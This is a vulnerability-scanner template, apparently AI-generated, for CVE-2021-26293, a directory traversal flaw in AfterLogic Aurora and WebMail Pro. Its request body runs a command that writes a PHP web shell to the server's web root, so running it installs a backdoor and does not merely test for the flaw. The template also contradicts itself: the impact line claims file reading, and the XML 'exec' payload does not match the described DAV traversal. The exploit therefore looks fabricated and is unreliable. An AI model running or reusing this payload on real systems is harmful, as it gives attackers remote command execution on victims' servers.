id: CVE-2021-26293

info:
  name: AfterLogic Aurora and WebMail Pro Directory Traversal via DAV
  author: ProjectDiscoveryAI
  severity: critical
  description: An issue was discovered in AfterLogic Aurora through 8.5.3 and WebMail Pro through 8.5.3, when DAV is enabled. They allow directory traversal to create new files (such as an executable file under the web root).
  impact: |
    An attacker can exploit this vulnerability to read arbitrary files from the server.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://github.com/0day404/vulnerability-poc
    - https://github.com/EdgeSecurityTeam/Vulnerability
    - https://github.com/J1ezds/Vulnerability-Wiki-page
    - https://github.com/Threekiii/Awesome-POC
    - https://github.com/tzwlhack/Vulnerability
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-26293
    cwe-id: CWE-22
    epss-score: 0.0029
    epss-percentile: 0.6975
    cpe: cpe:2.3:a:afterlogic:aurora:*:*:*:*:*:*:*:*
  metadata:
    vendor: afterlogic
    product: aurora
    fofa-query: "X-Server: AfterlogicDAVServer"

http:
  - method: POST
    path:
      - "{{BaseURL}}/vendor/afterlogic/dav/lib/DAVServer.php"
      - "{{BaseURL}}/libraries/afterlogic/DAV/Server.php"

    body: |
      <DAVServer>
        <exec>
          <command>echo '<?php system($_GET["cmd"]); ?>' > ../../webshell.php</command>
        </exec>
      </DAVServer>

    headers:
      Content-Type: application/xml
    matchers:
      - type: status
        status:
          - 200
